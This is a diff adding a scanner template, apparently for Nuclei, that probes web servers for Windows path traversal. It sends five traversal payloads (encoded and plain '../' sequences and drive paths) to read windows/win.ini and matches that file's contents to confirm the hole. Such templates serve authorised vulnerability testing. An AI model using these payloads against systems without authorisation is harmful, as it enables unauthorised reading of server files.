@@ -1,0 +1,33 @@
+id: poc-yaml-generic-path-traversal-windows
+info:
+  name: Generic Path Traversal Vulnerability (Windows)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: path-traversal
+
+variables:
+  r_path:
+    - /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+    - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
+    - /../../../../../../../../../../../../windows/win.ini
+    - /c:\\windows\\win.ini
+    - /c:/windows/win.ini
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{r_path}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
